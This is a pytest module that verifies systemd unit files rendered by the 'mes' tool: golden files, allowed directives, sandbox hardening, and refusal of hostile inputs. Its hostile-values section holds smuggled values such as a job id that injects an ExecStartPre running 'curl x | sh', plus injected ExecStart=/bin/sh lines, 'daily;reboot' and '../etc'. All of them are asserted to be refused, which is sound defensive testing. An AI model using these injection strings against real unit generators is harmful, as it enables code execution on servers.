"""Linux-independent checks of every system unit mes renders for a server (mes.units).

Three layers:

1. Golden files: the exact text of every unit of a sample project is compared with
   ``tests/golden/units/<unit name>``. After a deliberate change, regenerate them with
   ``MES_UPDATE_GOLDEN=1 uv run pytest tests/test_units.py`` and review the diff.
2. Structure: every file is parsed the way systemd reads it (sections, ``Key=Value``, no line
   continuations) and may only contain the directives mes means to write.
3. Hardening: every unit that runs project code runs as the project's account with the full
   sandbox, writes only the project's own folders, and has no network unless the job lists hosts.

Plus hostile values: names, run lines, schedules, sizes, hosts and paths that would add
directives or weaken the sandbox are refused before anything is rendered.
"""

from __future__ import annotations

import os
import re
import shutil
import subprocess
from pathlib import Path

import pytest

from mes import paths, units
from mes.errors import Refused
from mes.manifest import UI, Job, Project

import projects as helpers

GOLDEN = Path(__file__).parent / "golden" / "units"
UPDATE = os.environ.get("MES_UPDATE_GOLDEN") == "1"
MES = "/usr/local/bin/mes"
EASY_UI = "/usr/local/bin/easy-ui"
ROOT = "/var/lib/mes"

PROJECT_TOML = """
[project]
name = "demo"
title = "Demo"
version = "0.1.0"
apps = ["demo_app", "demo_tool"]

[ui]
refresh_after = ["demo-app.build"]
"""

APP_TOML = """
[app]
name = "demo-app"
command = "demo-app"

[jobs.sync]
run = "sync --days 3"
schedule = "*-*-* 06:00:00"
network = ["api.example.com", "auth.example.com"]
memory = "512M"
timeout = "20m"

[jobs.build]
run = "build '50% done' $HOME"
after = "sync"
writes = ["data"]

[jobs.hook]
run = "sync --quick"
webhook = true
writes = ["state"]

[jobs.export]
run = "export"
manual = true
"""

TOOL_TOML = """
[app]
name = "demo-tool"
command = "demo-tool"

[jobs.report]
run = "report"
after = "demo-app.build"
writes = []
"""

EXPECTED_FILES = sorted([
    "mes-demo.gate-read.socket", "mes-demo.gate-read@.service",
    "mes-demo.gate-write.socket", "mes-demo.gate-write@.service",
    "mes-demo.gate-deploy.socket", "mes-demo.gate-deploy@.service",
    "mes-demo.job.demo-app.sync.service", "mes-demo.job.demo-app.sync.timer", "mes-demo.net.demo-app.sync.service",
    "mes-demo.job.demo-app.build.service", "mes-demo.job.demo-tool.report.service",
    "mes-demo.job.demo-app.hook.service", "mes-demo.job.demo-app.hook.path",
    "mes-demo.job.demo-app.export.service",
    "mes-demo.ui-refresh.service",
    "mes-demo.webhook.socket", "mes-demo.webhook.service",
])

SANDBOX_KEYS = {line.split("=", 1)[0] for line in units.SANDBOX_LINES}
DIRECTIVES = {
    "Unit": {"Description", "Requires", "After", "Before", "OnSuccess"},
    "Service": SANDBOX_KEYS | {
        "Type", "User", "Group", "ExecStartPre", "ExecStart", "ExecStopPost", "WorkingDirectory", "Environment", "Slice",
        "MemoryMax", "MemorySwapMax", "TimeoutStartSec", "RuntimeMaxSec", "StandardInput", "StandardOutput",
        "StandardError", "ReadWritePaths", "InaccessiblePaths", "PrivateNetwork", "RestrictAddressFamilies",
        "IPAddressDeny",
    },
    "Timer": {"OnCalendar", "Persistent", "RandomizedDelaySec", "Unit"},
    "Path": {"PathModified", "Unit"},
    "Socket": {"ListenStream", "SocketUser", "SocketGroup", "SocketMode", "Accept", "MaxConnections", "Service"},
    "Install": {"WantedBy"},
}


@pytest.fixture(scope="module")
def project(tmp_path_factory):
    return helpers.load(tmp_path_factory.mktemp("demo"), PROJECT_TOML, {"demo_app": APP_TOML, "demo_tool": TOOL_TOML})


@pytest.fixture(scope="module")
def layout():
    return paths.server_layout("demo", ROOT)


@pytest.fixture(scope="module")
def files(project, layout):
    return units.render_project(project, layout=layout, mes=MES, easy_ui=EASY_UI)


def directives(text: str) -> list[tuple[str, str, str]]:
    """Parse a unit like systemd would and check that it only holds directives mes means to write."""
    out = []
    section = None
    assert text.endswith("\n") and "\r" not in text
    for raw in text.split("\n"):
        assert not raw.endswith("\\"), f"line continuation in {raw!r}"
        assert not re.search(r"[\x00-\x08\x0b-\x1f\x7f]", raw), raw
        line = raw.strip()
        if not line or line[0] in "#;":
            continue
        if line.startswith("["):
            assert line.endswith("]"), raw
            section = line[1:-1]
            assert section in DIRECTIVES, section
            continue
        key, sep, value = line.partition("=")
        assert sep, f"not a directive: {raw!r}"
        assert section is not None, raw
        assert key in DIRECTIVES[section], f"unexpected directive {key!r} in [{section}]"
        out.append((section, key, value))
    return out


def values(text: str, key: str) -> list[str]:
    return [v for _, k, v in directives(text) if k == key]


def one(text: str, key: str) -> str:
    found = values(text, key)
    assert len(found) == 1, (key, found)
    return found[0]


def split_exec(value: str) -> list[str]:
    """Undo exec_line for a line of fully quoted words."""
    words = re.findall(r'"((?:[^"\\]|\\.)*)"', value)
    assert " ".join(f'"{w}"' for w in words) == value.lstrip("+")
    return [re.sub(r"\\(.)", r"\1", w).replace("%%", "%").replace("$$", "$") for w in words]


def _is_project_code(name: str) -> bool:
    return ".job." in name and name.endswith(".service") or name.endswith("@.service") \
        or name.endswith(".ui-refresh.service") or name.endswith(".webhook.service")


# =========================================================================== golden files


def test_the_sample_project_renders_exactly_these_files(files):
    assert sorted(files) == EXPECTED_FILES
    for name in files:
        assert units.UNIT_NAME_RE.fullmatch(name)


@pytest.mark.parametrize("name", EXPECTED_FILES)
def test_golden(files, name):
    path = GOLDEN / name
    if UPDATE:
        GOLDEN.mkdir(parents=True, exist_ok=True)
        path.write_text(files[name])
    assert path.is_file(), f"missing golden file {path}; run with MES_UPDATE_GOLDEN=1 and review it"
    assert files[name] == path.read_text(), f"{name} changed; if on purpose, run with MES_UPDATE_GOLDEN=1"


def test_no_stale_golden_files():
    if GOLDEN.is_dir():
        assert sorted(p.name for p in GOLDEN.iterdir()) == EXPECTED_FILES


@pytest.mark.skipif(shutil.which("systemd-analyze") is None, reason="needs systemd-analyze (Linux)")
def test_systemd_analyze_accepts_the_units(files, tmp_path):
    for name, text in files.items():
        (tmp_path / name).write_text(text)
    res = subprocess.run(["systemd-analyze", "verify", "--man=no", *sorted(str(p) for p in tmp_path.iterdir())],
                         capture_output=True, text=True, check=False)
    bad = [line for line in res.stderr.splitlines() if "Unknown key" in line or "Invalid" in line]
    assert not bad, res.stderr


# =========================================================================== structure


def test_every_file_parses_into_known_directives_and_markers(files):
    for name, text in files.items():
        directives(text)
        assert text.startswith(units.HEADER + "\n"), name
        assert units.read_markers(text)[0] == "demo", name
        if ".job." in name or ".net." in name:
            assert units.read_markers(text)[1] == ".".join(name.split(".")[2:4]), name


# =========================================================================== hardening


@pytest.mark.parametrize("name", [n for n in EXPECTED_FILES if _is_project_code(n)])
def test_project_code_runs_sandboxed_as_the_project_account(files, layout, name):
    text = files[name]
    assert one(text, "User") == "mes-demo" and one(text, "Group") == "mes-demo"
    for line in ("NoNewPrivileges=yes", "ProtectSystem=strict", "ProtectHome=yes", "PrivateTmp=yes",
                 "PrivateDevices=yes", "CapabilityBoundingSet=", "AmbientCapabilities=", "RestrictSUIDSGID=yes",
                 "SystemCallFilter=@system-service", "SystemCallArchitectures=native", "ProtectKernelModules=yes",
                 "ProtectKernelTunables=yes", "ProtectControlGroups=yes", "RestrictNamespaces=yes",
                 "LockPersonality=yes", "LimitCORE=0"):
        assert line in text.split("\n"), (name, line)
    assert one(text, "MemoryMax")
    assert one(text, "RestrictAddressFamilies")
    assert one(text, "Slice") == units.SLICE
    # Writable folders: only the project's own, and the code only for deploys.
    allowed = {str(layout.data), str(layout.state), str(layout.store), str(layout.ui), str(layout.triggers)}
    if "gate-deploy" in name:
        allowed.add(str(layout.code))
    for value in values(text, "ReadWritePaths"):
        for p in value.split():
            assert p in allowed, (name, p)
    # The webhook key is readable only by the webhook receiver, which checks signatures with it.
    hides_key = any(str(layout.webhook_key) in v for v in values(text, "InaccessiblePaths"))
    assert hides_key == (name != "mes-demo.webhook.service"), name
    env = values(text, "Environment")
    assert f'"MES_PROJECT=demo"' in env and f'"MES_DATA_DIR={layout.data}"' in env
    assert not any("PATH=" in e and "MES_" not in e for e in env if e.startswith('"PATH='))


@pytest.mark.parametrize("name", [n for n in EXPECTED_FILES if _is_project_code(n) and "gate-deploy" not in n
                                  and "sync" not in n])
def test_no_network_unless_declared(files, name):
    text = files[name]
    assert one(text, "PrivateNetwork") == "yes"
    assert one(text, "RestrictAddressFamilies") == "AF_UNIX"
    assert one(text, "IPAddressDeny") == "any"


def test_job_with_hosts_reaches_only_what_the_helper_allows(files):
    sync = files["mes-demo.job.demo-app.sync.service"]
    assert values(sync, "PrivateNetwork") == []
    assert one(sync, "RestrictAddressFamilies") == "AF_UNIX AF_INET AF_INET6"
    assert one(sync, "IPAddressDeny") == "any"
    assert one(sync, "Requires") == "mes-demo.net.demo-app.sync.service"
    assert one(sync, "After") == "mes-demo.net.demo-app.sync.service"
    assert "# network: only api.example.com, auth.example.com" in sync

    net = files["mes-demo.net.demo-app.sync.service"]
    assert values(net, "User") == []  # root: only root may change another unit's settings
    assert split_exec(one(net, "ExecStart")) == [
        MES, "jobs", "allow-network", "--unit", "mes-demo.job.demo-app.sync.service", "--",
        "api.example.com", "auth.example.com"]
    assert one(net, "CapabilityBoundingSet") == "CAP_SYS_ADMIN"
    assert one(net, "Before") == "mes-demo.job.demo-app.sync.service"
    for line in ("NoNewPrivileges=yes", "ProtectSystem=strict", "ProtectHome=yes", "PrivateTmp=yes",
                 "SystemCallFilter=@system-service"):
        assert line in net.split("\n")
    assert values(net, "ReadWritePaths") == [] and values(net, "WorkingDirectory") == ["/"]


def test_job_service_runs_the_app_and_records_as_root(files, layout):
    sync = files["mes-demo.job.demo-app.sync.service"]
    assert one(sync, "Type") == "oneshot"
    assert split_exec(one(sync, "ExecStart")) == [
        f"{layout.current_project}/.venv/bin/demo-app", "--json", "sync", "--days", "3"]
    post = one(sync, "ExecStopPost")
    assert post.startswith("+")
    # Root gets only names and the fixed server folder, never anything from the project's files.
    assert split_exec(post) == [MES, "jobs", "record", "--project", "demo", "--server-root", ROOT, "demo-app.sync"]
    # A job that may write data first brings the shared database in line with project.toml.
    assert split_exec(one(sync, "ExecStartPre")) == [MES, "db", "sync", "--quiet", "--project-dir",
                                                     str(layout.current_project)]
    assert f'"MES_PROJECT_DIR={layout.current_project}"' in values(sync, "Environment")
    assert one(sync, "MemoryMax") == "512M" and one(sync, "MemorySwapMax") == "0"
    assert one(sync, "TimeoutStartSec") == "1200"
    assert one(sync, "UMask") == "0077"
    assert one(sync, "WorkingDirectory") == str(layout.current_project)
    assert '"MES_ALLOW=write"' in values(sync, "Environment")
    assert '"MES_JOB=demo-app.sync"' in values(sync, "Environment")
    assert one(sync, "ReadWritePaths") == f"{layout.data} {layout.store} {layout.state}"
    assert "[Install]" not in sync
    report = files["mes-demo.job.demo-tool.report.service"]
    assert split_exec(one(report, "ExecStart"))[0] == f"{layout.current_project}/.venv/bin/demo-tool"
    assert values(report, "ReadWritePaths") == []  # writes = []
    assert values(report, "ExecStartPre") == []  # it may not write data, so no schema sync
    hook = files["mes-demo.job.demo-app.hook.service"]
    assert one(hook, "ReadWritePaths") == str(layout.state) and values(hook, "ExecStartPre") == []


def test_after_chain_and_dashboard_refresh(files):
    assert one(files["mes-demo.job.demo-app.sync.service"], "OnSuccess") == "mes-demo.job.demo-app.build.service"
    # A job of another app waits for build (after = "demo-app.build").
    assert one(files["mes-demo.job.demo-app.build.service"], "OnSuccess") == \
        "mes-demo.job.demo-tool.report.service mes-demo.ui-refresh.service"
    assert values(files["mes-demo.job.demo-tool.report.service"], "OnSuccess") == []
    ui = files["mes-demo.ui-refresh.service"]
    assert split_exec(one(ui, "ExecStart")) == [
        EASY_UI, "--json", "--project-dir", f"{ROOT}/demo/code/current/project", "data", "build"]
    assert one(ui, "UMask") == "0027" and one(ui, "ReadWritePaths") == f"{ROOT}/demo/ui"
    assert '"MES_ALLOW=read"' in values(ui, "Environment")
    assert f'"MES_ROOT={ROOT}"' in values(ui, "Environment")  # how easy-ui finds the server layout
    assert f'"MES_ROOT={ROOT}"' in values(files["mes-demo.gate-deploy@.service"], "Environment")
    assert not any("EASYUI_STATE_HOME" in t for t in files.values())


def test_quotes_percent_and_dollar_in_run_lines(files):
    build = files["mes-demo.job.demo-app.build.service"]
    start = one(build, "ExecStart")
    assert '"50%% done" "$$HOME"' in start
    assert split_exec(start)[-2:] == ["50% done", "$HOME"]


def test_timer_and_webhook_path(files, layout):
    timer = files["mes-demo.job.demo-app.sync.timer"]
    assert one(timer, "OnCalendar") == "*-*-* 06:00:00"
    assert one(timer, "Persistent") == "true"
    assert one(timer, "RandomizedDelaySec") == str(units.RANDOM_DELAY_SEC)
    assert one(timer, "Unit") == "mes-demo.job.demo-app.sync.service"
    assert one(timer, "WantedBy") == "timers.target"
    path = files["mes-demo.job.demo-app.hook.path"]
    assert one(path, "PathModified") == f"{layout.triggers}/demo-app.hook"
    assert one(path, "Unit") == "mes-demo.job.demo-app.hook.service"
    for name in ("mes-demo.job.demo-app.export.service", "mes-demo.job.demo-app.build.service"):
        assert name.replace(".service", ".timer") not in files


def test_webhook_receiver(files, layout):
    sock = files["mes-demo.webhook.socket"]
    assert one(sock, "ListenStream") == "/run/mes-demo-webhook.sock"
    assert one(sock, "SocketUser") == "root" and one(sock, "SocketMode") == "0600"
    assert one(sock, "Accept") == "no"
    svc = files["mes-demo.webhook.service"]
    assert split_exec(one(svc, "ExecStart")) == [MES, "webhook", "serve", "--project", "demo", "--server-root", ROOT]
    assert one(svc, "ReadWritePaths") == str(layout.triggers)
    hidden = one(svc, "InaccessiblePaths").split()
    assert {f"-{layout.data}", f"-{layout.store}", f"-{layout.code}"} <= set(hidden)


@pytest.mark.parametrize("level", units.GATE_LEVELS)
def test_gate_instances(files, layout, level):
    sock = files[f"mes-demo.gate-{level}.socket"]
    assert one(sock, "ListenStream") == units.gate_socket_path("demo", level) == f"/run/mes-demo-gate-{level}.sock"
    assert one(sock, "SocketUser") == "mes-demo" and one(sock, "SocketGroup") == "mes-demo"
    assert one(sock, "SocketMode") == "0600" and one(sock, "Accept") == "yes"
    svc = files[f"mes-demo.gate-{level}@.service"]
    assert split_exec(one(svc, "ExecStart")) == [
        MES, "gate", "child", "--project", "demo", "--server-root", ROOT, "--level", level]
    assert one(svc, "StandardInput") == "socket" and one(svc, "StandardOutput") == "socket"
    hidden = one(svc, "InaccessiblePaths").split()
    assert {f"-{layout.state}/gate", f"-{layout.webhook_key}", f"-{layout.incoming}"} <= set(hidden)
    rw = values(svc, "ReadWritePaths")
    if level == "read":
        assert rw == []
    elif level == "write":
        assert rw == [f"{layout.data} {layout.state} {layout.store}"]
    else:
        assert rw == [f"{layout.code} {layout.state} {layout.ui}"]
        assert values(svc, "PrivateNetwork") == []  # uv sync needs the internet
        assert one(svc, "RuntimeMaxSec") == "1800"
    assert one(files[f"mes-demo.gate-{level}.socket"], "MaxConnections") == ("1" if level == "deploy" else "4")


ONE_JOB = '[app]\nname = "demo-x"\ncommand = "demo-x"\n[jobs.x]\nrun = "x"\nmanual = true\n'


def test_project_without_ui_or_webhook_has_no_such_units(layout, tmp_path):
    p = helpers.load(tmp_path / "a", '[project]\nname = "demo"\napps = ["demo_x"]\n', {"demo_x": ONE_JOB})
    names = units.render_project(p, layout=layout, mes=MES, easy_ui=EASY_UI)
    assert not any("webhook" in n or "ui-refresh" in n or ".timer" in n for n in names)
    assert "mes-demo.job.demo-x.x.service" in names
    # [ui] without refresh_after, or no easy-ui on the server: no refresh unit.
    p2 = helpers.load(tmp_path / "b", '[project]\nname = "demo"\napps = ["demo_x"]\n[ui]\nrefresh_after = []\n',
                      {"demo_x": ONE_JOB})
    assert "mes-demo.ui-refresh.service" not in units.render_project(p2, layout=layout, mes=MES, easy_ui=EASY_UI)
    p3 = helpers.load(tmp_path / "c", '[project]\nname = "demo"\napps = ["demo_x"]\n[ui]\nrefresh_after = ["demo-x.x"]\n',
                      {"demo_x": ONE_JOB})
    assert "mes-demo.ui-refresh.service" not in units.render_project(p3, layout=layout, mes=MES)


def test_two_projects_never_share_a_unit_name(layout, tmp_path):
    a = helpers.load(tmp_path / "a", '[project]\nname = "fit"\napps = ["fit_data"]\n',
                     {"fit_data": '[app]\nname = "fit-data"\ncommand = "fd"\n[jobs.sync]\nrun = "x"\nmanual = true\n'})
    b = helpers.load(tmp_path / "b", '[project]\nname = "fit-data"\napps = ["fd_sync"]\n',
                     {"fd_sync": '[app]\nname = "fd-sync"\ncommand = "fd"\n[jobs.x]\nrun = "x"\nmanual = true\n'})
    na = set(units.render_project(a, layout=paths.server_layout("fit", ROOT), mes=MES))
    nb = set(units.render_project(b, layout=paths.server_layout("fit-data", ROOT), mes=MES))
    assert not na & nb


def test_old_unit_name_forms_are_not_job_units():
    assert not units.JOB_UNIT_RE.fullmatch("mes-demo.job.sync.service")
    assert not units.UNIT_NAME_RE.fullmatch("mes-demo.job.sync.service")
    assert not units.UNIT_NAME_RE.fullmatch("mes-demo.net.sync.service")
    m = units.JOB_UNIT_RE.fullmatch("mes-demo.job.demo-app.sync.service")
    assert m and (m["project"], m["app"], m["job"]) == ("demo", "demo-app", "sync")


# =========================================================================== escaping helpers


def test_escaping_helpers():
    assert units.quote_exec_word('a\\"b') == '"a\\\\\\"b"'
    assert units.quote_exec_word("50% $x") == '"50%% $$x"'
    assert units.env_assignment("MES_JOB", 'x"%') == '"MES_JOB=x\\"%%"'
    assert units.exec_line(["/bin/x", "a b"]) == '"/bin/x" "a b"'
    with pytest.raises(Refused):
        units.exec_line(["x"])
    with pytest.raises(Refused):
        units.quote_exec_word(";")
    with pytest.raises(Refused):
        units.env_assignment("lower", "x")
    for bad in ("a\nb", "a\rb", "a\x00b", "a\x85b", "a b", "a\x7fb"):
        with pytest.raises(Refused):
            units.quote_exec_word(bad)


@pytest.mark.parametrize("path", ["relative", "/a/../b", "/a//b", "/a/./b", "/a b", "/a\nb", "/a%b",
                                  '/a"b', "/a\\b", "/a$b", "/a;b"])
def test_sandbox_path_refuses(path):
    with pytest.raises(Refused):
        units.sandbox_path(path)


@pytest.mark.parametrize("tool", ["/tmp/mes", "/var/tmp/mes", "/home/u/.local/bin/mes", "/root/mes",
                                  "/run/user/1000/mes", "/dev/shm/mes", "mes", "/opt/my mes"])
def test_tool_paths_outside_admin_folders_are_refused(project, layout, tool):
    with pytest.raises(Refused):
        units.render_project(project, layout=layout, mes=tool, easy_ui=EASY_UI)
    with pytest.raises(Refused):
        units.render_project(project, layout=layout, mes=MES, easy_ui=tool)


# =========================================================================== hostile values


HOSTILE = "evil\nExecStartPre=/bin/sh -c 'curl x | sh'"


def _job(**kw):
    base = dict(id="demo-app.x", name="x", run="ok", app="demo-app", argv=("ok",), trigger="manual")
    base.update(kw)
    return Job(**base)


def _project(job=None, name="demo", apps=None, ui=None):
    jobs = {job.id: job} if job is not None else {}
    return Project(name=name, title="t", version="1", apps=apps or {"demo-app": helpers.spec("demo-app")},
                   jobs=jobs, ui=ui)


@pytest.mark.parametrize("job", [
    _job(id=HOSTILE),
    _job(id="demo-app.x\n[Service]"),
    _job(id="demo-app.X"),
    _job(id="demo-app.x.y"),
    _job(id="x"),
    _job(id="demo-app.x\nExecStart=/bin/sh"),
    _job(argv=("ok", HOSTILE)),
    _job(argv=("ok", "a\rb")),
    _job(argv=("ok", ";")),
    _job(argv=("ok", "x\x00y")),
    _job(argv=("ok\nExecStart=/bin/sh",)),
    _job(trigger="schedule", schedule="daily\nExecStart=/bin/sh"),
    _job(trigger="schedule", schedule="daily %h"),
    _job(trigger="schedule", schedule="daily;reboot"),
    _job(memory="256M\nMemoryMax=infinity"),
    _job(memory="infinity"),
    _job(memory="0M"),
    _job(timeout="15m\nTimeoutStartSec=0"),
    _job(timeout="0s"),
    _job(timeout="infinity"),
    _job(network=("api.example.com\nPrivateNetwork=no",)),
    _job(network=("evil host",)),
    _job(network=("0.0.0.0/0",)),
    _job(writes=("data", "/etc")),
    _job(writes=("code",)),
])
def test_hostile_job_values_are_refused(job, layout):
    with pytest.raises(Refused) as e:
        units.render_project(_project(job), layout=layout, mes=MES, easy_ui=EASY_UI)
    assert e.value.code == "unsafe_unit_value"
    assert e.value.exit_code == 5


@pytest.mark.parametrize("name", ["demo\nExecStart=/bin/sh", "Demo", "../etc", "a", "demo.job", "demo x",
                                  "demo/x", "-demo", "x" * 40])
def test_hostile_project_name_refused(name, layout):
    with pytest.raises(Refused):
        units.render_project(_project(_job(), name=name), layout=layout, mes=MES)
    with pytest.raises(Refused):
        units.job_unit(name, "demo-app.x")
    with pytest.raises(Refused):
        units.gate_socket_path(name, "read")


@pytest.mark.parametrize("cli", ["demo\nExecStart=/bin/sh", "../../bin/sh", "/bin/sh", "de mo"])
def test_hostile_app_program_refused(cli, layout):
    with pytest.raises(Refused):
        units.render_project(_project(_job(), apps={"demo-app": helpers.spec("demo-app", cli)}), layout=layout,
                             mes=MES)


@pytest.mark.parametrize("root", ["/srv/my mes", "/srv/mes\nExecStart=/bin/sh", "relative", "/srv/../etc",
                                  "/srv/50%", '/srv/"x', "/srv/a\\b", "/srv/$HOME"])
def test_hostile_server_root_refused(root):
    layout = paths.server_layout("demo", root)
    with pytest.raises(Refused):
        units.render_project(_project(_job()), layout=layout, mes=MES)


def test_hostile_value_in_one_job_renders_nothing(layout, tmp_path):
    p = helpers.load(tmp_path, '[project]\nname = "demo"\napps = ["demo_x"]\n', {"demo_x": ONE_JOB})
    bad = _job(id="demo-x.b", name="b", app="demo-x", argv=("ok", HOSTILE))
    p = Project(name=p.name, title=p.title, version=p.version, apps=p.apps, jobs={**p.jobs, "demo-x.b": bad})
    with pytest.raises(Refused):
        units.render_project(p, layout=layout, mes=MES)


def test_manifest_rejects_hostile_names_before_rendering():
    from mes.errors import MesError
    from mes.manifest import loads, loads_app

    with pytest.raises(MesError):
        loads_app('[app]\nname = "demo-x"\ncommand = "x"\n[jobs."x\\nExecStart=/bin/sh"]\nrun = "ok"\nmanual = true\n')
    with pytest.raises(MesError):
        loads('[project]\nname = "demo\\nUser=root"\napps = ["a_b"]\n')
    with pytest.raises(MesError):
        loads_app('[app]\nname = "demo-x"\ncommand = "x"\n[jobs.x]\nrun = "ok"\nmanual = true\nnetwork = ["a b"]\n')
    with pytest.raises(MesError):
        loads_app('[app]\nname = "demo-x"\ncommand = "x\\nExecStart=/bin/sh"\n')


def test_ui_refresh_needs_safe_easy_ui(layout):
    p = _project(_job(), ui=UI(refresh_after=("demo-app.x",)))
    with pytest.raises(Refused):
        units.render_ui_refresh(p, layout=layout, easy_ui="/tmp/easy-ui")
    text = units.render_ui_refresh(p, layout=layout, easy_ui=EASY_UI)
    directives(text)


def test_unit_name_patterns():
    assert units.JOB_UNIT_RE.fullmatch("mes-demo.job.demo-app.sync.service")
    for bad in ("mes-demo.net.demo-app.sync.service", "mes-demo.job.demo-app.sync.timer",
                "mes-demo.job.demo-app.sync.service\n", "mes-Demo.job.demo-app.sync.service",
                "mes-demo.job..service", "mes-demo.job.sync.service", "mes-demo.job.a.b.c.service"):
        assert not units.JOB_UNIT_RE.fullmatch(bad)
    with pytest.raises(ValueError):
        units.job_unit("demo", "x", "socket")
    with pytest.raises(ValueError):
        units.gate_units("demo", "admin")
